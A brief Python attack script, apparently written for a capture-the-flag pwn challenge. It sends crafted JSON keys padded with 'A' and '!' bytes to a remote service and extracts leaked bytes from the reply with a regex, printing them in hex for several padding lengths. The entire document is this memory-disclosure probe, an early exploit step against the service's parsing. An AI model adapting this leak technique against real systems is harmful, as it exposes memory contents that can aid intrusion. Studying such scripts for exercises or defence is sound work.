#!/usr/bin/env python3
import remote, re, sys

def leak(nbang, na=38, extra_after=b''):
    key = b'A'*na + b'!'*nbang + extra_after
    desc = b'D'*40
    payload = b'{"' + key + b'|' + desc + b'":{}}'
    out = remote.run(payload, read_time=4.0)
    m = re.search(rb'Key: (.*?), Description', out, re.S)
    print("=== nbang=%d, na=%d ===" % (nbang, na))
    if not m:
        print("  NO KEY LEAK. raw tail:", repr(out[-300:]))
        return None
    le = m.group(1)
    print("  len=%d" % len(le))
    print("  hex: %s" % le.hex())
    return le

if __name__ == "__main__":
    for n in [3,4,5,6,8,12,20]:
        leak(n)
